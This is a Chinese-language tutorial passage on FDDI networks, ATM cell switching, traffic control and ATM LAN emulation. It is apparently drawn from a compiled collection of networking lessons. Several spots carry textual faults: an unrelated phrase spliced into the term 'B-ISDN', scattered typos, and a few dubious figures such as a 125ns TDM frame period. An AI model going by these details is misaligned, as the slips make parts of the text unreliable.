只要终端站与支持虚拟局域网的交换机或集线器连接，网络的任何部分或设备均可
能是虚拟局域网成员。LAN交换和ATM及路由选择的结合构成了交换式虚拟网络的基
础，减轻网络管理负担是虚拟局域网的一个重要优点，今后几年它将成为网络生产
厂商开发的重点。
（4）FDDI网简介
光纤分布数据接口（FDDI）是目前成熟的LAN技术中传输速率最高的一种。这种传输
速率高达100Mb/s的网络技术所依据的标准是ANSIX3T9.5。该网络具有定时令牌协议的特
性，支持多种拓扑结构，传输媒体为光纤。使用光纤作为传输媒体具有多种优点：
１、较长的传输距离，相邻站间的最大长度可达2KM，最大站间距离为200KM。
２、具有较大的带宽，FDDI的设计带宽为100Mb/s。
３、具有对电磁和射频干扰抑制能力，在传输过程中不受电磁和射频噪声的影响,也不影
　　响其设备。
４、光纤可防止传输过程中被分接偷听，也杜绝了辐射波的窃听,因而是最安全的传输媒
　　体。
　　由光纤构成的FDDI，其基本结构为逆向双环，如图1所示。一个环为主环，另一个环
为备用环。当主环上的设备失效或光缆发生故障时,通过从主环向备用环的切换可继续维
持FDDI的正常工作。这种故障容错能力是其它网络所没有的。本期将就FDDI的基本构件，
拓扑结构以及操作原理等进行介绍。

图1
一、FDDI的构件
图1
　　 从图1可初步看到，构成FDDI的构件至少应具有下述部分：
　　 １、光纤电缆。
　　 ２、FDDI适配器。
　　 ３、FDDI适配器与光纤相连的连接器。
　　 然而，为了使该网络具有很强的适应性，并能将作为骨干网的FDDI与部门较低速的
20Mb/s Ethernet相连，还需多种互连设备。?属于这种类型的构件有下述几种：
　　１、FDDI-Ethernet网桥。
　　２、FDDI集中器。
　　３、光旁路器。

　　１、光纤电缆(第一期的解释）

　　 我们知道，按照光在光纤中的传播方式划分，光纤可分为多模光纤和单模光纤；单模
光纤比多模光纤具有更高的传输速率和更长的传输距离。单模光纤的纤芯直径为8到10μｍ，
包层直径为125μｍ；多模光纤纤芯直径为62.5μｍ，包层直径为125μｍ，并通常写为
62.5/125μｍ。包层对光具有不同的折射率（R1）， 其值通常小于纤芯的1%。如果光线以
小于临界角的入射角射到纤芯和包层界面，光线将会通过包层进入外套而被吸收。
　　 使用光纤作为传输媒体必须具备光电变换设备， 即光发送器和光接收器。光发送器将
要发送的编码数据转换为一串光信号，用来携带数据。FDDI标准X3T9.5规定，光发送器使用
光二极管（LED）或激光二极管（LD）。LED用于多模光纤，LD用于单模光纤。接收器通常为
光检测器，用于将外来的光信号转换为电信号。光检测器的一个重要性质是接收灵敏度，它
是外入光信号使接收器工作必须具有的最小功率。应该指出，接收器灵敏度是针对一定范围
的光波长而言的。
　　 光波长是指在光纤上用来携带数据的光射线的近似波长.光源以一定的一组波长发射光
线。波长度量单位为nm。在FDDI技术中，光发送器发出的光，其波长约为1300nm,如图2所示。
光发送器发射的光功率散射在一定范围内，其中心波长则为标称光波长。从图2可看出,光散
射的范围在LD作光源时较窄，而在LED作光源时较宽。
图2
　　 光在沿光纤传输时与电在导体中传输一样，其强度会逐渐减弱，这就是衰减。 光纤链
路的衰减由单位衰减量和链路长度决定。单位衰减量是经过规定的单位长度时的衰减，单位
为dB。根据FDDI标准，在波长为1300nm时，1km的最大衰减量为1.5dB。
　　 衡量光纤衰减的另一种参数是功率预算， 其功率预算值由最小发送功率和接收器灵敏
度决定。FDDI标准规定功率预算为11dB。
　　 应该强调指出，光功率的衰减除在沿光纤传输时有损耗外， 光经过连接器和接头同样
也会产生损耗。在连接器和和接头处引入的损耗称为功率恶化(power penalty）。在上述各
环节引入的最大损耗量下仍能维持系统工作的总损耗称为链路损耗预算，它是最小发送器功
率与接收器灵敏度减去任何功率恶化之差。

　　２、光纤媒体连接器

　　 FDDI网络节点与光纤相连需要连接器，连接器有两种：
　　１、MIC媒体接口连接器。
　　２、ST型连接器。
　　 MIC连接器如图3（a）所示。 MIC的结构可确保光纤与节点中的发送／接收光学器件对
准。该连接器由带锁的插头和带销的插座组成。锁的作用是保证插头安装不会出错，因为安
装不正确将使FDDI构成的环失效。
　　 ST型连接器也可用于连接光纤和FDDI节点， 但这种连接器的插座未提供带锁机构，如
不小心，有可能反接。显而易见，这种连接器具有较低的费用。ST型连接器如图3（b）所示。
图3（a) 图3（b）
　　３、FDDI端口类型

　　 FDDI标准对如何与光纤的连接规定了一些规则,旨在防止构成错误的拓扑结构。在FDDI
标准中，规定了四种端口类型：
　　１、端口类型A。
　　２、端口类型B。
　　３、端口类型M。
　　４、端口类型S。
　　 同时具备这四种端口类型的FDDI设备是集中器，如图4所示。端口用于连接FDDI的主环
入和备环出； 端口B用于连接FDDI双环中和环出和备环入；端口Ｍ用于连接单连接站（SAS),
双连接站（DAS）或另外的集中器；端口S用于连接到集中器上。
图4
　　 FDDI标准规定了两类站，即上述的单连接站（SAS）和双连接站（DAS）。所谓DAS是具
有两个FDDI端口，因而能直接与双环相连的工作站；单连接站（SAS）只有一个FDDI端口,要
与FDDI环相连必须经过集中器。两类站在FDDI双环结构中的连接如图5所示。 图中数据站1、
数据站2和集中器都具有双环连接的能力，所以是双环连接站（DAS），通过集中器只与主环
相连的数据站A、B和C都属于单连接站（SAS）。
图5
二、FDDI适配器
FDDI适配器虽然按所用机器总线不同各有差异，但与光纤接口部分原理是相同的。
为了解这种适配器的结构，先要了解FDDI技术所遵循的标准。

　　１、FDDI网络体系结构
　　 FDDI是在OSI参考模型出现后发展起来的一种高速网络技术。它所遵循的标准完全处
于OSI框架下，如图6所示。由图可以看出， FDDI将OSI模型的物理层和数据链路层分别分
成了两个子层。物理层分割成的两个子层是：
图6
　　１、物理层协议层（PHY）。
　　２、物理媒体相关层（PMD）。
　　PHY子层规定了传输编码和译码、时钟要求及符号集合；PMD规定了光纤媒体应具备的
条件以及连接器等。
　　数据链路层分割成的两个子层为媒体访问控制（MAC）和逻辑链路控制（LLC）。这两
个子层的功能与ISO 8802.3（Ethernet）,IEEE 802.5（Token Ring）相似。MAC子层规定
了FDDI定时令牌协议所需要的帧格式、寻址和令牌处理。LLC子层为LLC用户提供了交换数
据的手段。
　　 FDDI的站管理（SMT）标准定义如何对物理媒体相关层、物理层协议层和媒体访问控
制部分进行控制和管理。
　　 按照FDDI网络体系结构层次构成的连接模型,如图7所示.由图7可以更清楚地看到,每
个子层所处的地位和应承担的功能。

图7
　　 为便于读者查阅标准，现将每个子层的ANSI和ISO标准号码列于附表中。
附表　FDDI标准
ANSI/ISOFDDI 标准
X3.166-1990/
ISO9314-3:1990PMD(物理媒体相关）
X3.148-1988/
ISO9314-1:1989PHY（物理层协议）
X3.139-1987/
ISO9314-2:1989MAC（媒体访问控制）
X3T9.5/84-49SMT（站管理）

　　２、单连接站和双连接站
　　 单连接站（SAS）是连接到环上的最简形式，但只能连接到主环上，要连到双环则必
须经过集中器。
　　 SAS的结构如图8（a）所示， 由MAC，PHY和PMD实体组成。MAC（媒体访问控制）主要
功能是构造帧，用于携带用户数据或管理信息；PHY的主要功能是执行与媒体无关的数据编
码／译码和同步等功能；PMD的主要功能前面已介绍， 是与媒体相关的功能。从图8
（a）可以看到,与光纤相连的只有两条，一条用于发送，另一条用于接收。这表明SAS只能
连接到主环上。显而易见,史连接到主环的让不管是光纤或站如果失效，都无法切换到备用
环。解决这一问题的方法是将SAS连接到集中器上，由集中器来实现这种功能。
　　 DAS与SAS相反，它可连接到主环和备用环上，因为DAS内包括2个PHY,2个PMD和2个MAC
和一个可选择的光旁路中继器，如图8（b）所示。DAS可以在设备失效时，从主环切换到备
用环。
　　　 
图8(a)　　　　　　　　　图8(b)
　　SAS和DAS都含有一个处于重要位置的站管理实体。这一实体的作用,顾名思义是对FDDI
网络、诊断故障站之类的连接管理功能，以及环管理和监视，都是该实体的功能。
　　３、FDDI适配器
　　 FDDI适配器根据所用的计算机总线有同而有差异，但这些差异只反映在与主机的接口
上，其它部分基本上相同。FDDI适配器通常由下述功能块组成：
　　１、FDDI功能块。
　　２、帧缓冲寄存器。
　　３、节点核心块。
　　４、系统总线接口单元块。
　　 前三个功能块是FDDI的核心，可用于任何系统总线的FDDI适配器。图9示出的是VMEbus 
FDDI适配器框图。
图9
FDDI功能块具有双连接站的功能，带有一个MAC。光纤发送器用于连接外部光纤。该模
块对系统的接口使用Abus（32位）与帧缓冲器相接。与节点处理器接口则通过Cbus（8位）实
现。该功能块全部由FDDI基本媒体访问控制器、节点处理器和VMEbus.3端口帧缓冲器具有双
端口的VRAM（映像RAM）。 该功能块还含有其它多种接口。
　　 节点核心包括节点处理器、EPROM、本地存储器、DUART、本地总线和系统总线接口.这
是FDDI适配器的控制中心。
　　系统总线接口单元经过各自的Mbus接口单元，Vbus接口单元和VMEbus接口单元将这三个
总线集成在一起。
三、FDDI集中器
FDDI集中器在FDDI网络中起着重要作用。其一是提供了布线的灵活性；其二是增加了
网络的可靠性和连通性。
　　 像单连接站一样，集中器也有单连接和双连接之分。 同样地，也将前者称为SAC，后
者称为DAC。FDDI集中器的作用是连接多个SAC，DAS或其它集中器到FDDI双环上。通过级连
集中器，可构成双环树结构。当以单独一台形式使用时,可形成类似Ethernet Hub式的工作
组结构。
　　 集中器的结构与连接站类似，所有同的是有多个端口，如图10所示。
图10
从网络体系结构看，不管是M、S还是A、B端口，都是PMD和PHY实体的组合。PMD实体的
功能是实现从电气信号到光信号的转换或反转换。PHY实体实现4B／5B编码／译码， 监视链
路差错等。媒体访问控制（MAC）是可选的，它在集中器中主要提供附加的管理服务,使其本
身作为可管理的元素。 MAC实体能使集中器参与基于SMT帧的协议操作,从而可方便地隔离故
障，易于从故障状态下恢复。
　　图10中示出的配置开关在集中器的站插入和站旁路两项功能中起着重要的作用。配置开
关的功能是通过对FDDI连接管理协议的控制，或从网管站发布命令来实现对端口入环和出环
操作。
　　 站旁路的功能是在所连接的站失效情况下，使集中器能将故障站在逻辑上与环断开。
四、FDDI MAC帧
在FDDI逆向双环或其它结构下，光纤上传输的数据单元称为媒体访问控制（MAC）帧，
如图11所示。 
PA SD FC DA SA 　I　 FCS ED FS 
PA:帧首序列　　　　　　　I:信息
SD:帧首定界符　　　　　　FCS:帧检验序列
FC:帧控制（２个符号）　　ED:帧尾定界符
DA:终点地址　　　　　　　FS:帧状态
SA:源点地址
　　　　　　(a)帧格式
PA SD FC ED 
　　　　　　(b)令牌格式　　　　　　　　　图11

　　帧由9个字段组成，每个字段各有其自身的功能。现将这些功能简述如下：
　　１、前导码（PA）
　　 用来使帧与每一站的时钟进行同步。帧起始站发出的前导码由64比特的16个空闲符号
组成。随后的站可改变字段长度，以适应时钟的要求。
　　２、帧首定界符（SD）
　　指示帧的开始，长总是以民于数据的信号码型组成。其编码为JK，其中J和K均为非数
据符号。
３、帧控制（FC）
　　其比特格式为CLFFZZZZ。C表明帧类型，L表明16比特或48地址,FF表明该帧是LLC帧还
是MAC控制帧。
　　４、终点地址（DA）
　　表明帧欲发往的站。该地址可为单站地址，组播地址或广播地址。
　　５、源点地址（SA）
　　发出该帧的站地址。
　　６、包括LLC数据和与操作有关的信息。
　　７、帧检验序列
　　长度为32位，用于对FC，DA，SA和信息字段进行保护。
　　８、帧尾定界符（ED）
　　由一些非数据符号组成。对于令牌，ED的长度为8比特，对其它帧则为4比特。
　　９、帧状态（FS）
　　 由差错位，地址识别、帧被拷贝等指示位组成。每一指示由一个符号表示。FS还可包
括附加控制位，其使用由实现者来确定。
五、FDDI的操作原理
FDDI建立在小令牌帧的基础上，当所有站都空闲时，小令牌帧沿环运行。当某一站有
数据要发送这时，必须等待有令牌通过时才可能。一旦识别出有用的令牌，该站便将其吸
收，随后便可发送一帧或多帧。这时环上没有令牌环上后，便在环上插入一新的令牌，不
必像802.5令牌环那样，只有收到自己发送的帧后才能释放令牌。因此,任一时刻环上可能
会有来自多个站的帧运行。图１２示出了FDDI的令牌工作。 
(a) (b)
(c) (d)
(e) (f)
　　 FDDI双环可以同步和异步两种方式操作。在同步操作中，工作站可确保具有一定百
分比的可用总带宽。这种情况下的带宽分配是按照目标令牌旋转时间（TTRT）来进行的。

TTRT是针对网络上期望的通信量所期望的令牌旋转时间。 该时间值是在环初始化期间协
商确定的.具有同步带宽分配的工作站，发关这数据的时间长度不能超过分配给它的TTRT
的百分比。所有站完成同步传输后剩下的时间分配给剩余的节点,并以异步方式操作。异
步方式又可进一步分为限制式和非限制式两种方式，就不进一步讨论了。
六、FDDI的网络拓扑结构
按照FDDI的标准，可使用多种拓扑结构，其中下述四种极为重要：
　　１、独立集中器型。
　　２、逆向双环。
　　３、集中器树。
　　４、树型双环。
　　 独立集中器型由一个集中器和连接站组成，如图１３所示，连接站可以是SAS也可以
是DAS，看上去像Ethernet中Hub所构成的结构。独立集中器型通常用来连接高性能的设备，
或用来连接多个LAN。
图13(a)
　　 逆向双环结构如图１３（b）所示。DAS可直接连到双环上。这种结构适用于地理范围
分布广的企业或其它场合。
图13(b)
　　 集中器树如图１３（c）所示。当很多用户设备需要连接在一起时，可使用这种结构。
集中器按分层星形方式相连，其中一个集中器用作树的根，也就是起Hub作用。这种结构的
特点是，增加或去掉FDDI集中器、SAS或DAS，或改变其地理位置，都不破坏FDDI的工作。
图13(c)
　　 树型双环结构中，集中器级连在一起，双环则处于企业或校园最重要的骨干位置，这
种结构具有高度的容错特性，而且是最为灵活的拓扑形式。支干增加只需通过增加集中器便
可实现，并可保证提供备份数据通路。然而，这种结构造价是最高的一种。
（5）ATM网络简介
随着人们对集话音、图像和数据为一体的多媒体通信需求的日益
增加，特别是为了适应今后信息高速公路建设的需要，人们又提出了
的宽带综合业务数字网（B-ISDN）这种全新的通信网络， 而B-ISDN
的实现需要一种全新的传输模式，此即异步传输模式（ATM）。在
1990年，国际电报电话咨询委员会（CCITT）正式建议将ATM作为实现
B－ISDN的一项技术基础，这样，以ATM为机制的信息传输和交换模式
也就成为电信和计算机网络操作的基础和2l世纪通信的主体之一。尽
管目前世界各国，都在积极开展ATM技术研究和B-IS黑客基础知识大全DN的建设， 但以
ATM为基础的B-ISDN的完善和普及却还要等到下一世纪，所以称ATM为
一项跨世纪的新兴通信技术。不过， ATM技术仍然是当前国际网络界
所注意的焦点，其相关产品的开发也是各厂商想要抢占的网络市场的
一个制高点。
本期讲座将从以下五个方面进行介绍：
一、ATM基本概念
同步和异步 
　　　　　　为了更好地了解ATM，有必要先对时分复用（TDM）和同步传输（STM）
作一简单的回顾。TDM即是在一条通信线路上按一定的周期（如125ns）将时间分成
称为帧的时间块，而在每一帧中又分成若干时隙，每个时隙可携带相应的用户信息。
当某一用户通过呼叫建立起通信后，在此期间，其信号将固定地占用各帧中的某一
时隙，直至通信结束，如图1所示。
图1
　　 而对于同步传输，其交换是在固定时隙之间进行的。例如，在图1中，输入帧
占用第2时隙的某一信号，若在输出帧中占用的是第4时隙，则这种对应关系是固定
不变的，直至相应的通信过程结束，如图2所示。
图2
　　在这种固定时隙的传输及交换模式中，若在通信过程中的某一时刻，用户无数
据传递，但其固定占用的时隙仍属其所有，尽管此刻处于空闲状态；相反，若其有
大量突发性数据要求传送，尽管这有可能造成信号的延时甚至是信元的丢失，也仍
只能借助于固定的时隙来传输和交换。
　　相比之下，在异步传输模式（ATM）中，其信元传输所占用的时隙并不固定,这
也是所谓的统计时分复用。另外，在一帧中占用的时隙数也不固定,可以有1至多个
时隙，完全根据当时用户通信的情况而定。而且各时隙之间并不要求连续，纯粹是
“见缝插针”。在交换时，也是类似的。这个过程如图3所示。
图3
由于在ATM中具有动态分配带宽的特点，可以充分地利用带宽资源,并且能很好
地满足传输突发性数据的要求，而不致出现在ATM中的延时或信元丢失的情况。
　　以上仅仅是通过与ATM的对比，大致介绍了一下ATM的基本概念。
ATM的信元格式
　　在分组交换体制中，数据往往是被分成一个个的数据分组。而在ATM中,所用的
数据分组究竟应该是固定长度还是可变长度，其长度究竟以多长为好了对这些问题，
CCITT的研究组在作了深入的研究和协商后，将ATM的数据分组取为固定长度，并将
其称为ATM信元。另外,信元的长度也确定为53个字节。采用不长的字节数有助于提
高ATM信元的处理速度，因为，传输这样一个信元，在155Mb／s的系统中仅需2.8us。
从交换的实现来看，采用固定长的信元便于采用硬件来实现。ATM的信元格式如图4
所示。
　　在图4中，信头由5个字节的内容组成，主要用来标明在异步时分复用上属于同
一虚拟通路的信元，并完成适当的选路功能。具体来说，信头中包括这样一些内容，
即：一般流量控制(GFC)；虚拟通道标识（VPI）；虚拟通路标识（VCI）;净荷类型
标识（PTI）；信元丢失优先等级（CLP）；信头差错控制（HEC）。剩余的48字节的
信息段则是净荷的数据。
48字节的由来：
　　ＡＴＭ信元载体部
分的长度开始不统一美
国与欧洲分别是64和32。
制定协议时采取了一个
平均值：
（32+64）/2=48
图4
　　网络设备通过检查信元头来决定如何处理这个信元及将此信元送往何处。
网络设备不检查信元载体，它只被看作是？？？？384ｂｉt的一个单位（48
字节）。因此载体是由数据,语音或是视频bit中的哪一种组成无关重要,bit
就是bit。 因此可在单一的网络上同时支持所有数据的传输，这是ＡＴＭ的
突出优点。另一方面，由于信元长度小， 网络传输和交换速率快，所以ATM
可以很好地实现语音、活动图像等对时延敏感的业务。
二、ATM规程
与帧中继和x.25一样，ATM也是面向连接的。ATM的规程分为三层：下面是物理层，
中间是ATM层，上面是ATM适配层。物理层规定了ATM数据流和物理介质之间的接口，其
中包括两个子层：物理介质相关子层和传输会聚子层。物理介质相关子层规定了ATM数
据流通过给定介质传输的速率。 会聚子层规定了通过物理介质相关子层传输的信元的
规程。ATM层是ATM技术的核心，虽然有多个ATM适配层和多个物理层可供选择，但是描
述信头的结构和控制信元的交换是固定的，不因分层的不同而有所区别。ATM层负责信
元的选路、复用、和反复用。

ATM规程的最高层是ATM适配层（AAL）。它将高层来的用户业务转换成ATM中净荷的
格式和长度,到目的站后将它再转换成原来的用户业务。该层包括五个子层(AAL1-AAL5)，
不同的ATM适配子层与ATM所支持的不同业务相一致。AAL1支持固定比特率（CBR）业务，
如数字化的声音和图象信号，用于对信元延迟和丢失都敏感的应用；AAL2支持对时间敏
感的可变比特率（VBR）业务；AAL3/4支持面向连接的突发性业务，和数据业务;AAL5支
持突发的LAN数据业务。AAL层还可以将面向连接的ATM与面向无连接的数据综合在一起，
使ATM用户能进行广播和一点对多点通信。
三、ATM的传输控制
监视和管理信元在网络中的传输叫作传输控制。它做得好坏至关重要，特别是对时延
敏感的视频数据。不同类型的通信需要不同水平的服务。一个ＡＴＭ网对不同通信类型提
供不同的QOS(服务质量）水平。

　　１．ATM通信类型
　　 我们可以按ＡＴＭ网的三个特性：带宽、等待时间和信元延迟变化来对通信类型分
类。带宽是为支持某一连接的网络容量大小。等待时间是与连接有关的延迟量。若需要低
的等待时间意味着信元需要快速从网络中的一点传到另一点。信元延迟变化是每一相关信
元组所经历的延迟范围。低的信元延迟变化意味着一组信元必须以相互间相隔不太远的方
式通过网络。
　　 ATM网有三种通信类型:CRB（Constant bit rate恒定位速率）、VRB(Variable bit 
rate变化位速率）和ARB（Available bit rate可用位速率）。CRB通信包括声音和视频。
为完成这种通信，ATM提供一个恒定的带宽、低等待时间和低信元延迟变化。VRB通信除
了需求不同带宽以外与CRB相似。ABR通信不需要确定带宽或延迟参数并被许多数据应用
所接受。

　　2．ATM连接
　　 通过发出一个导致与ＡＴＭ网协商的连接请求，ATM的一端请求ATM网络与另外一端
相连接。这一过程称为连接建立程序。 必须协商的多数可由 ATM Forum UNI 3.0指定，
包括通信类型、恒定和峰值带宽,信号序列长度及QOS级别。这一过程保证ATM网与端点建
立一个“条约”。网络承诺递交一个QOS， ATM端点承诺不送出比连接过程中所要求的更
多的通信量。
　　当阻塞发生时,传输控制提供机制使网络恢复状态。ATM网使用三种传输控制技术:传
输管制、传输整形和阻塞控制：

(１)传输管制(Traffic Policing)
　　ＡＴＭ网为确保每一连接中的通信不超出协商的参数，ATM开关使用一个“漏水桶”
算法来管理通信。想象在木水桶的底部有一个孔,水以固定速率（协商速率）从桶内（缓
冲区）流出。当信息流超过协商速率和缓冲区溢出时，需要进行传输管制。每一个ATM信
元头有一个CLP(Cell Loss Priority)位，即信元丢失属性位，用来指示信元是否与合同
相一致。举个例子，如果信元与合同不一致,意味着可能有比合同允许的更多的信元,ATM
开关置CLP位为１。这个信元只有在有足够网络容量时，才能通过网络被传输，如果没有
足够的带宽可获得，CLP位不一致的信元被丢掉，这时需要重新传输这些信元。 CBR通信
需要一个单一“漏桶”，因为在它的网络协议中使用的是固定速率多数。VBR通信使用双
“漏桶”，一方面在一些分立的时间间隔监视固定速率，另一方面在连 接期间监视最大
（峰值）带宽。如果任何一个值超过协议参数，ATM开关通过控制CLP位管理VBR通信。
(2)传输整形（Traffic Shaping）
　　与传输管制相似,传输整形是在用户——网络界面上完成的。使用双“漏桶”算法控
制通信使流量速率遵守协议规定。完成传输整形的装置是典型的用在PC机或工作站、桥、
路由器和DSUs（数字服务单元）中的ＡＴＭ网络适配器。
(3)阻塞控制
　　阻塞会发生在任何网络中，当一个用户送出的数据大于网络在可获得带宽内传输量，
就发生阻塞。当更多用户向同一网络输送数据时，对任一用户可获得的带宽也随着时间
而改变。大多数网络不能告诉使用者在任一给定的瞬间可获得多少带宽。其结果使用者
没有任何依据来控制所送数据的量。当送出的数据大于网络所能处理的数据时，网络缓
冲区填满并溢出，数据必须重新传输,这将进一步增加通信量更加使得网络拥挤。ATM网
络执行阻塞控制以使ＡＢＲ通信能够有效地使用带宽。有效的阻塞控制可减少由于阻塞
重新传输数据的需要。
　　ATM扩大了网络能力以支持各种各样的应用和帮助网络管理者。使用ATM技术作为基
础，确保一个与广域网（WAN）的可接受界面，满足LAN中高宽带业务需求。传输管理设
计保证用户得到他们所需要的服务质量。
四、ATM网络的LAN仿真
现有网络上运行的网络层协议种类繁多，如IP、IPX、Appletalk、DECnet、
Banyan、Vines等，要实现ＡＴＭ网络与现有的多种ＬＡＮ网络互连的关键是使
用相同的网络层协议，例如统一使用IP和IPX协议，因为网络层的功能便是为高
层协议和应用程序提供一致的网络视图。
　　ATM网络取得成功的一个关键因素就是具备与这些技术互操作的能力。跨越
ATM网络运行网络层协议有2种实现方式。一种称为本机模式操作,即使用地址改
变技术将网络层地址直接映射成ATM地址,这样网络层信息包就可通过ATM网络传
送。另一种通过ATM网络传送网络层信息包的方法是LAN仿真（LANE─—LAN Em－
ulation）。
　　LANE是在ATM网络顶端仿真一个局域网。LANE协议特别定义了用于IEEE802.3
以太网和IEEE 802.5令牌环LAN的仿真。LANE是指LANE协议为高层定义了与现有
LAN相同的业务接口，通过ATM网络传送的数据仍以相应的LAN MAC信息包格式封
装。LANE使得ATM的所有方面，包括建立连接、单元分割和重组(SAR)， 对节点
完全透明。
　　LANE使任何网络较高层协议不需要进行修改，就可在ATM网络上运行。因为
LANE服务为网络层驱动程序提供与现有MAC协议相同的服务接口（如网络驱动器
接口规范NDLS或开放数据链路接口ODI的驱动程序接口）。所以不需要对这些驱
动程序进行任何修改。

　　LANE协议规定了单个仿真LAN（ELAN）的运行,一个ATM上可以同时存在多个
ELAN，每个ELAN仿真的是以太网或令牌环网。　

　　LANE协议将会在２种ATM设备上使用：
　　(１) ATM网络按口卡（NIC）
　　ATM NIC将执行LANE协议，并实现到ATM网络的揍口，在连接的终端系统上，
ATM NIC将为较高层协议提供当前的LAN服务接口。这样，在终端系统的网络层
协议将继续使用同LAN一样的过程通信，同时能够使用ATM网络的广泛带宽。
　 (２) 网络互连和LAN交换设备
　　主要指连接ATM的LAN交换机和路由器.这些设备和与其直接相连的、带有的
ATM主机一起用来提供虚拟LAN服务。 由于LAN仿真本质上就是ATM上的一个桥接
协议， LANE协议的基本功能就是把ＭＡＣ地址改变为ATM地址，所以LAN仿真特
别适合快速多端口的LAN交换设备。 如我校的校园计算机网络中即采用了IBM公
司的LANE服务器实现网络互连和LAN交换。
　　LAN仿真规范模型包括LAN仿真客户机（LEC）、LAN仿真服务器（LES），广
播和未知服务器(BUS)以及LAN仿真配置服务器（LECS）。
　 LEC为ELAN中的单个终端系统执行数据传送、地址分析和其它控制功能,同时
还为自己与任何高层机构提供一个标准的服务接口。与ELAN接口的ATM NIC或LAN
交换机构在每个连接的ELAN上支持一个LEC，每个LEC由一个独立的ATM地址来标
识，而且与一个或多个可通过该ATM地址到达的MAC地址相连。
LES为一个特定的ELAN执行控制功能。每个ELAN只有一个逻辑LES，既LES属于一
个特定的ELAN。每个LES都有自己专用的一个ATM地址来标识。
　　BUS是一个多点广播服务器，其作用是扩展未知目标地址流量，并向一个特
定ELAN中的客户机传递多点广播和广播流量,每个LEC在ELAN上只与一个BUS相连，
但在一特定的ELAN上可能有多个BUS，它们以厂商确定的方式通信和协调。一个
LEC连接的BUS由自己专有的一个ATM地址标识。在LES中，该地址与广播MAC地址
相连，这一映射通常配置在LES中。
　　LECS通过将各个LANE客户机分配到ELAN相应的LES，把客户机指定给特定的
ELAN。每个管理域只有一个逻辑LECS，它为本域中所有的ELAN服务。
LANE协议没有规定LES、BUS和LECS的具体位置， 目前大多数厂商都在网络设备
(ATM交换机和路由器)而不是主机和工作站上实施，以保证其高性能和可靠性。
五、LAN仿真的运行过程
LANE通过一系列ATM连接进行相互通信。LEC间保持各自连接，以便传输数据和控制
流量。
　　控制连接包括直接配置虚通道连接（Virtual Channel　Connection，VCC）、直接
控制VCC和分布控制VCC。直接配置VCC是一个双向点对点VCC，是由LEC设置到LECS的;直
接控制VCC也是个双向VCC，是由LEC设置到LES的；分布控制VCC是一个单向VCC,从LES返
回LEC，通常这是一个点对多点连接。
　　数据连接包括直接数据VCC。多点广播发送VCC和多点广播传递VCC。直接数据VCC是
在两个希望交换数据的LEC间设置的双向点对点VCC。 通常两个LEC使用同一个直按数据
VCC传送它们之间的所有信息包，而不是为它们之间的每对MAC地址建立一个新的VCC,这
样可以节约连接资源和设置连接的等待时间;多点广播发送VCC也是一个双向点对点VCC，
是由LEC设置到BUS的；多点广播传递VCC是一个单向VCC，是从BUS设置到LEC的，通常这
是一个点对多点连接，每个LEC是它的叶节点。

LAN仿真的运行包括初始化。连接和数据传输三个阶段。
1．初始化
　　初始化时，LEC通过地址登记得到自己的ATM地址，然后,LEC设置一个到LECS的直接
配置连接，LEC可通过三种方法找到LECS的位置：使用一个确定的ANI过程确定LECS的地
址；使用一个已知的LECS的地址;使用一个已知的到LECS的永久连接（VPI:0，VCI＝17）。
　　确定LECS的位置后，LEC将建立到LECS的直接配置VCC，一经连接，　LECS就使用一
个配置协议通知LEC，把它连接到目标ELAN上，其中包括LES的ATM地址。被仿真的LAN的
类型。ELAN上最大信息包的大小以及ELAN的名称。
2．连接
　　LEC一得到LES地址，即清除LECS的直接配置VCC，然后设置到LES的直接控制VCC,同
时,LES为LEC指定一个独有的LEC标识符（LECID）,然后LEC在LES上登记自己的MAC和ATM
地址。
　　随后，LES设置一个回到LEC的分布控制VCC。这样LEC就可以在LAN仿真ARP(LE－ARP)
过程中使用直接或分布控制VCC来对应于特定MAC地址的ATM地址。这一过程中，LEC组成
一个LE—ARP，并把它发送到LES。如果LES能够识别这个映射（因为某些LEC登记了有关
MAC地址），就可通过直接控制VCC直接回答， 同时把该请求传递到分布控制VCC，向一
个知道所求MAC地址的LEC请求一个响应。
　　如果一个LEC能够响应LE－ARP，它会通过直接控制VCC响应LES。然后，LES可以只把
这个响应传回给请求的LEC，也可通过分布控制传递给所有的LEC，这样所有的LEC都可以
得到并高速缓存这个特定的地址映射。
　　为完成初始化,LEC使用这个LE一ARP机制来确定BUS的ATM地址。它通过向LES发送MAC
广播地址的LE—ARP来完成，后者用BUS的ATM地址响应。然后，　LEC设置到BUS的多点广
播发送VCC。接着，这个BUS设置多点广播，将VCC传回到LEC，通常把这个LEC作为点到多
点连接的叶节点。这样LEC就作好了数据传输的准备。
3．数据传输
　　在数据传输过程中，　LEC或是收到一个从高层协议发送来的网络层信息包，或是收
到一个通过LAN端口传递的MAC信息包。前者数据源点LEC将没有目标LEC的ATM地址。此时，
LEC首先组成并向LES发送一个LE一ARP响应。
　　在等待LE一ARP的响应时，　LEC还把信息包用规定的封装传递给BUS， BUS将把信息
包扩散到所有的LEC。LEC一旦收到一个LE－ARP响应,就向目的节点设置一个直接数据VCC，
并用它进行数据传输，而不使用BUS路径。但在此之前LEC必须确保所有原来发送给BUS的
信息包在使用直接数据VCC前已经传送到了目的地。在这个机制中，一个控制信元将随上
一个信息包发送到第一条传输路径，在目的地答复收到这个信元之前,不使用第二条路径
发送信息包。
　　如果一个数据直挂连接已经存在于LEC，通过它可以到达一个特定的MAC地址， 则源
LEC可以重新使用这个数据直接连接。
　　如果没有收到对LE—ARP的响应，LEC将继续向BUS发送信息包，同时将定期重新发送
LE—ARP，直至收到一个响应。通常情况下，一个信息包通过BUS扩散， 而且目标对源响
应后，一些LEC将知道目的地位置，然后对后继LE—ARP作出响应。
　　LEC将把通过LE—ARP得到的所有MAC地址从本地缓存到ATM地址映射中，如果LEC收到
把一个信息包发送到同一MAC地址的要求，它将参考这个本地缓存表并使用缓存的映射，
而不会再发出另一个LE－ARP。
　　LEC也使用BUS进行信息包广播和多点广播。信息包被传递给BUS后， BUS即把它们重
新导向所有LEC，LEC对所有从BUS收到的数据帧根据前缀LECID过滤有关字段,以便确保不
会收到自己发出的帧。
六、ATM的现存问题及前景
虽然ATM的相关技术及研究发展很快，但ATM总体上仍有待于进一步完善。
无论在其开发和使用的实践中目前都还存在一些问题,如ATM的话务量管理及
拥塞控制方面的技术并不理想；目前ATM产品的价格普遍较高；ATM的标准尚
不完善，在适应性、通用性及互操作性等方面均带来一些问题。
　　尽管如此，Am作为一种全新的交换技术和下一世纪通信技术的主流已是
不容置疑的。ATM最早是作为新一代的电信技术基础而提出来的.其优势首先
体现在构造骨干网上，因为一方面它有上Gb／s的容量，再则，由于VP、VC
技术的采用，容量和处理的灵活性是目前时分长途电话交换网所不能比拟的。
